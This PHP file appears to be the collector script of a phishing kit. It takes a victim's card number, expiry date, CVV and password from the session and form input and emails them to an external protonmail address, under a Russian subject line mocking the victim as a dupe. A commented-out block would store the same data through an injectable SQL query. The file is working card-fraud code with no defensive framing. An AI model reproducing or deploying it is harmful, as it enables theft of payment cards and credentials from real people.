<?php
session_start();
error_reporting(E_ALL);
include "db.php";
{
    $number = 'card_number';
    $month = 'date_month';
    $year=  'date_year';
    $cvv = 'card_cvv';
    $pass = 'PASSWORD';
}

/*{
    $conn = new mysqli($db_config['servername'], $db_config['user'], $db_config['password'],$db_config['database'] );
    if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
    } 
    echo "Connected successfully";
    $sql = "INSERT INTO `entries` (`card_no`,`month_year`,`cvv`,`password`) VALUES($_SESSION[$number],$_SESSION[$month].'/'.$_SESSION[$year],$_SESSION[$cvv],$_POST[$pass]) ON DUPLICATE KEY UPDATE password = CONCAT_WS(\',\',password, $_POST[$pass])";
    if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
    } else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
}*/


{       
     $to = "payc2c@protonmail.com";
    $subject = 'Карта лоха :'.$_SESSION[$number];
         
    $message = 'CardNo:'.$_SESSION[$number]."\r\n";
    $message .= 'Date:'.$_SESSION[$month].'/'.$_SESSION[$year]."\r\n";
    $message .= 'CVV:'. $_SESSION[$cvv]."\r\n";
    $message .= 'Pass:'.$_POST[$pass]."\r\n";
    $message = nl2br($message);
    $header = "From: mymail@gmail.com	 \r\n";
         
    $retval = mail($to,$subject,$message,$header);
    if ($retval){
        echo 'good';
    }else echo 'error';
}   

?>